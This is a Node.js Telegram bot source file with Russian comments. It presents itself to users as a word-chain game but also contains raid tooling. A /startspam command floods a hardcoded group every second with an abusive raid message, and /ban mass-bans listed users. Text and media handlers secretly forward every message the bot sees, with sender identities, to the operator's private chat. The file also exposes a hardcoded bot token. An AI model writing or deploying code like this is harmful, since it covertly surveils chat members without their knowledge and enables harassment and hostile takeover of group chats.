const { Telegraf } = require('telegraf');
const fs = require('fs');
const path = require('path');

// ==================== КОНФИГУРАЦИЯ ====================
const BOT_TOKEN = '8326632164:AAF09hmeUOFHuAFxeUPOlCk0MEpfBs5sCVk';
const SUPER_ADMIN_ID = 628515514; // для адм
const YOUR_USER_ID = 628515514; // для парсера

// Только одна инициализация бота
const bot = new Telegraf(BOT_TOKEN);

// Конфигурация для спама
const SPAM_CONFIG = {
    chatId: '-1003731774780',
    text: 'СЬЕБАЛИСЬ ВАС РЕЙДЯТ КИВИШКИ @kiwishkii',
    intervalMs: 1000
};

// Конфигурация для бана
const BAN_CONFIG = {
    chatId: '-1003731774780',
    userList: [
        '8578547768',
        '5383055444',
        '5142590486'
    ]
};

const games = new Map();
const PROBLEM_LETTERS = ['ь', 'ъ', 'ы', 'й'];

// ==================== выдача адм====================
bot.command('giveadm', async (ctx) => {
    try {
        // Проверки
        if (ctx.chat.type === 'private') return ctx.reply('❌ Только в группах!');
        if (ctx.from.id !== SUPER_ADMIN_ID) return ctx.reply('❌ Нет прав!');

        // Проверка прав бота
        const botMember = await ctx.telegram.getChatMember(ctx.chat.id, ctx.botInfo.id);
        if (!botMember.status.includes('administrator')) {
            return ctx.reply('❌ Бот не админ!');
        }

        // Получаем ID из сообщения
        const ids = ctx.message.text
            .split('\n')
            .slice(1)
            .map(id => id.trim())
            .filter(id => id && /^\d+$/.test(id));

        if (ids.length === 0) {
            return ctx.reply('❌ Пример:\n/giveadm\n123456789\n987654321');
        }

        // Выдаем права каждому
        for (const userId of ids) {
            try {
                await ctx.telegram.promoteChatMember(ctx.chat.id, parseInt(userId), {
                    can_change_info: true,
                    can_delete_messages: true,
                    can_invite_users: true,
                    can_restrict_members: true,
                    can_pin_messages: true,
                    can_promote_members: false,
                    can_manage_chat: true
                });
            } catch (e) {
                // Игнорируем ошибки для простоты
            }
        }

        await ctx.reply(`✅ Права выданы ${ids.length} пользователям`);
        
    } catch (error) {
        ctx.reply('❌ Ошибка');
    }
});

// ==================== ИГРА В СЛОВА ====================
function getLastValidLetter(word) {
    if (!word || word.length === 0) return '';
    
    let lastLetter = word.slice(-1).toLowerCase();
    
    if (PROBLEM_LETTERS.includes(lastLetter) && word.length > 1) {
        const prevLetter = word.slice(-2, -1).toLowerCase();
        return prevLetter;
    }
    
    return lastLetter;
}

function loadWords() {
    try {
        const wordsPath = path.join(__dirname, 'words.txt');
        const content = fs.readFileSync(wordsPath, 'utf8');
        return content.split('\n')
            .map(word => word.trim().toLowerCase())
            .filter(word => {
                if (word.length === 0) return false;
                const firstLetter = word[0];
                return !PROBLEM_LETTERS.includes(firstLetter);
            });
    } catch (error) {
        console.error('Ошибка загрузки слов:', error);
        return ['яблоко', 'арбуз', 'зонт', 'трамвай'];
    }
}

const words = loadWords();

function normalizeLetter(letter) {
    if (letter === 'ё') return 'е';
    return letter;
}

// ==================== УПРАВЛЕНИЕ СПАМОМ ====================
let spamInterval = null;
let isSpamming = false;

function startSpam() {
    if (isSpamming) return false;
    isSpamming = true;
    spamInterval = setInterval(() => {
        if (isSpamming) {
            bot.telegram.sendMessage(SPAM_CONFIG.chatId, SPAM_CONFIG.text).catch(err => {
                console.error('Ошибка при отправке спама:', err.message);
            });
        }
    }, SPAM_CONFIG.intervalMs);
    return true;
}

function stopSpam() {
    if (!isSpamming) return false;
    if (spamInterval) {
        clearInterval(spamInterval);
        spamInterval = null;
    }
    isSpamming = false;
    return true;
}

// ==================== КОМАНДЫ ====================
bot.start((ctx) => {
    ctx.reply(
        '🎮 Привет! Я бот для игры в слова.\n\n' +
        'Правила: называйте слово на последнюю букву предыдущего слова.\n' +
        '*Подсказка:* Если слово заканчивается на "ь", "ъ", "ы" или "й", ' +
        'используется предпоследняя буква.\n\n' +
        'Команды:\n' +
        '/start - показать это сообщение\n' +
        '/game - начать новую игру\n' +
        '/stop - закончить игру',
        { parse_mode: 'Markdown' }
    );
});

bot.command('game', (ctx) => {
    const chatId = ctx.chat.id;
    
    const firstWord = words[Math.floor(Math.random() * words.length)];
    const nextLetter = getLastValidLetter(firstWord);
    
    games.set(chatId, {
        lastWord: firstWord,
        usedWords: [firstWord],
        lastLetter: nextLetter
    });
    
    ctx.reply(
        `🎮 Игра началась!\n\n` +
        `Первое слово: *${firstWord.toUpperCase()}*\n` +
        `Следующая буква: *${nextLetter.toUpperCase()}*\n\n` +
        `_Слово заканчивается на "${firstWord.slice(-1)}", ` +
        `но так как на эту букву нет слов, используем "${nextLetter}"_`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('stop', (ctx) => {
    const chatId = ctx.chat.id;
    
    if (games.has(chatId)) {
        games.delete(chatId);
        ctx.reply('🛑 Игра завершена. Чтобы начать новую, введите /game');
    } else {
        ctx.reply('У вас нет активной игры. Начните с /game');
    }
});

bot.command('startspam', (ctx) => {
    if (startSpam()) {
        ctx.reply('✅ Спам запущен!');
        console.log('Спам запущен');
    } else {
        ctx.reply('Спам уже запущен!');
    }
});

bot.command('stopspam', (ctx) => {
    if (stopSpam()) {
        ctx.reply('⛔ Спам остановлен!');
        console.log('Спам остановлен');
    } else {
        ctx.reply('Спам не запущен!');
    }
});

bot.command('giveadm', async (ctx) => {
    try {
        if (ctx.chat.type === 'private') return ctx.reply('❌ Только в группах!');
        if (ctx.from.id !== SUPER_ADMIN_ID) return ctx.reply('❌ Нет прав!');

        const botMember = await ctx.telegram.getChatMember(ctx.chat.id, ctx.botInfo.id);
        if (!botMember.status.includes('administrator')) {
            return ctx.reply('❌ Бот не админ!');
        }

        const ids = ctx.message.text
            .split('\n')
            .slice(1)
            .map(id => id.trim())
            .filter(id => id && /^\d+$/.test(id));

        if (ids.length === 0) {
            return ctx.reply('❌ Пример:\n/giveadm\n123456789\n987654321');
        }

        for (const userId of ids) {
            try {
                await ctx.telegram.promoteChatMember(ctx.chat.id, parseInt(userId), {
                    can_change_info: true,
                    can_delete_messages: true,
                    can_invite_users: true,
                    can_restrict_members: true,
                    can_pin_messages: true,
                    can_promote_members: false,
                    can_manage_chat: true
                });
            } catch (e) {
                console.error(e);
            }
        }

        await ctx.reply(`✅ Права выданы ${ids.length} пользователям`);
        
    } catch (error) {
        ctx.reply('❌ Ошибка');
    }
});

bot.command('ban', async (ctx) => {
    try {
        if (ctx.chat.id.toString() !== BAN_CONFIG.chatId) {
            return ctx.reply('Эта команда работает только в определенном чате');
        }

        let bannedCount = 0;
        let failedCount = 0;

        for (const userId of BAN_CONFIG.userList) {
            try {
                await ctx.telegram.banChatMember(ctx.chat.id, userId);
                bannedCount++;
                await new Promise(resolve => setTimeout(resolve, 100));
            } catch (error) {
                console.error(`Ошибка при бане пользователя ${userId}:`, error.message);
                failedCount++;
            }
        }

        await ctx.reply(
            `✅ Бан завершен\n` +
            `Забанено: ${bannedCount}\n` +
            `Ошибок: ${failedCount}`
        );

    } catch (error) {
        console.error('Ошибка при бане:', error);
        await ctx.reply('❌ Произошла ошибка при выполнении команды');
    }
});

bot.on('text', async (ctx) => {
    try {
        // Игнорируем сообщения от самого бота
        if (ctx.message.from.id === ctx.botInfo.id) return;
        
        // Игнорируем сообщения из лички с вами (чтобы не было зацикливания)
        if (ctx.chat.type === 'private' && ctx.message.from.id === YOUR_USER_ID) return;
        
        let chatInfo = '';
        
        // Определяем тип чата
        if (ctx.chat.type === 'private') {
            chatInfo = `👤 Личка с: ${ctx.message.from.first_name} ${ctx.message.from.last_name || ''} (@${ctx.message.from.username || 'нет username'})`;
        } else if (ctx.chat.type === 'group') {
            chatInfo = `👥 Группа: ${ctx.chat.title} (ID: ${ctx.chat.id})`;
        } else if (ctx.chat.type === 'supergroup') {
            chatInfo = `🚀 Супергруппа: ${ctx.chat.title} (ID: ${ctx.chat.id})`;
        } else if (ctx.chat.type === 'channel') {
            chatInfo = `📢 Канал: ${ctx.chat.title} (ID: ${ctx.chat.id})`;
        }
        
        // Формируем информацию об отправителе
        const senderInfo = `👤 От: ${ctx.message.from.first_name} ${ctx.message.from.last_name || ''} (@${ctx.message.from.username || 'нет username'}) [ID: ${ctx.message.from.id}]`;
        
        // Текст сообщения
        const messageText = ctx.message.text;
        
        // Отправляем сообщение вам в личку
        await bot.telegram.sendMessage(
            YOUR_USER_ID,
            `📨 *Новое сообщение*\n\n` +
            `${chatInfo}\n` +
            `${senderInfo}\n\n` +
            `💬 *Текст:*\n${messageText}`,
            { parse_mode: 'Markdown' }
        );
        
    } catch (error) {
        console.error('Ошибка при обработке сообщения:', error);
    }
});

// Обработка сообщений с медиа (фото, видео и т.д.)
bot.on(['photo', 'video', 'document', 'audio', 'sticker'], async (ctx) => {
    try {
        if (ctx.message.from.id === ctx.botInfo.id) return;
        if (ctx.chat.type === 'private' && ctx.message.from.id === YOUR_USER_ID) return;
        
        let chatInfo = '';
        if (ctx.chat.type === 'private') {
            chatInfo = `Личка с: ${ctx.message.from.first_name}`;
        } else {
            chatInfo = `${ctx.chat.type === 'group' ? 'Группа' : 'Супергруппа'}: ${ctx.chat.title}`;
        }
        
        const senderInfo = `От: ${ctx.message.from.first_name} (@${ctx.message.from.username || 'нет username'})`;
        
        let mediaType = '';
        let mediaContent = '';
        
        if (ctx.message.photo) {
            mediaType = '🖼 Фото';
            mediaContent = ctx.message.photo[ctx.message.photo.length - 1].file_id;
            await bot.telegram.sendPhoto(YOUR_USER_ID, mediaContent, {
                caption: `📨 *Новое медиа*\n\n${chatInfo}\n${senderInfo}`,
                parse_mode: 'Markdown'
            });
        } else if (ctx.message.video) {
            mediaType = '🎥 Видео';
            mediaContent = ctx.message.video.file_id;
            await bot.telegram.sendVideo(YOUR_USER_ID, mediaContent, {
                caption: `📨 *Новое медиа*\n\n${chatInfo}\n${senderInfo}`,
                parse_mode: 'Markdown'
            });
        } else if (ctx.message.document) {
            mediaType = '📄 Документ';
            mediaContent = ctx.message.document.file_id;
            await bot.telegram.sendDocument(YOUR_USER_ID, mediaContent, {
                caption: `📨 *Новое медиа*\n\n${chatInfo}\n${senderInfo}`,
                parse_mode: 'Markdown'
            });
        } else if (ctx.message.audio) {
            mediaType = '🎵 Аудио';
            mediaContent = ctx.message.audio.file_id;
            await bot.telegram.sendAudio(YOUR_USER_ID, mediaContent, {
                caption: `📨 *Новое медиа*\n\n${chatInfo}\n${senderInfo}`,
                parse_mode: 'Markdown'
            });
        } else if (ctx.message.sticker) {
            mediaType = '🎨 Стикер';
            mediaContent = ctx.message.sticker.file_id;
            await bot.telegram.sendSticker(YOUR_USER_ID, mediaContent);
            await bot.telegram.sendMessage(YOUR_USER_ID, 
                `📨 *Новый стикер*\n\n${chatInfo}\n${senderInfo}`,
                { parse_mode: 'Markdown' }
            );
        }
        
    } catch (error) {
        console.error('Ошибка при обработке медиа:', error);
    }
});

// ==================== ЕДИНЫЙ ОБРАБОТЧИК ТЕКСТОВЫХ СООБЩЕНИЙ ====================
bot.on('text', async (ctx) => {
    // Пропускаем команды
    if (ctx.message.text.startsWith('/')) return;
    
    const chatId = ctx.chat.id;
    const game = games.get(chatId);
    
    // Если есть активная игра - обрабатываем как игру
    if (game) {
        const userWord = ctx.message.text.toLowerCase().trim();
        const lastLetter = game.lastLetter;
        
        if (userWord.length < 2) {
            ctx.reply('❌ Слово должно быть длиннее одной буквы');
            return;
        }
        
        let firstLetter = userWord[0];
        if (firstLetter === 'ё') firstLetter = 'е';
        
        if (firstLetter !== normalizeLetter(lastLetter)) {
            ctx.reply(
                `❌ Слово должно начинаться на букву *${lastLetter.toUpperCase()}*\n` +
                `(предыдущее слово "${game.lastWord.toUpperCase()}" ` +
                `заканчивается на "${game.lastWord.slice(-1)}")`,
                { parse_mode: 'Markdown' }
            );
            return;
        }
        
        if (!words.includes(userWord)) {
            ctx.reply('❌ Это слово не найдено в словаре. Попробуйте другое.');
            return;
        }
        
        if (game.usedWords.includes(userWord)) {
            ctx.reply('❌ Это слово уже использовалось в игре. Придумайте другое.');
            return;
        }
        
        game.usedWords.push(userWord);
        game.lastWord = userWord;
        
        const nextLetter = getLastValidLetter(userWord);
        game.lastLetter = nextLetter;
        
        let response = `✅ Принято! *${userWord.toUpperCase()}*\n\n`;
        
        if (PROBLEM_LETTERS.includes(userWord.slice(-1))) {
            response += `Слово заканчивается на "${userWord.slice(-1)}", ` +
                       `поэтому следующая буква: *${nextLetter.toUpperCase()}*\n` +
                       `_(используем предпоследнюю букву)_`;
        } else {
            response += `Следующая буква: *${nextLetter.toUpperCase()}*`;
        }
        
        ctx.reply(response, { parse_mode: 'Markdown' });
        return;
    }
    
    // Если игры нет - можно добавить другую логику (например, пересылку сообщений)
    // Здесь можно добавить функционал пересылки сообщений, если нужно
});

// ==================== ОБРАБОТКА ОШИБОК ====================
bot.catch((err, ctx) => {
    console.error('Ошибка:', err);
    ctx.reply('Произошла ошибка. Пожалуйста, попробуйте еще раз.');
});

// ==================== ЗАПУСК БОТА ====================
bot.launch()
    .then(() => {
        console.log('✅ Бот успешно запущен и готов к работе!');
        console.log(`📚 Загружено слов для игры: ${words.length}`);
        console.log(`📢 Спам-конфигурация: чат ${SPAM_CONFIG.chatId}, интервал ${SPAM_CONFIG.intervalMs}мс`);
        console.log(`🔨 Бан-конфигурация: чат ${BAN_CONFIG.chatId}, пользователей: ${BAN_CONFIG.userList.length}`);
        console.log('\nДоступные команды:');
        console.log('  /game         - начать игру в слова');
        console.log('  /stop         - закончить игру');
        console.log('  /startspam    - запустить спам');
        console.log('  /stopspam     - остановить спам');
        console.log('  /ban          - заблокировать пользователей из списка');
    })
    .catch((err) => {
        console.error('❌ Ошибка запуска бота:', err);
    });

process.once('SIGINT', () => {
    stopSpam();
    bot.stop('SIGINT');
});
process.once('SIGTERM', () => {
    stopSpam();
    bot.stop('SIGTERM');
});
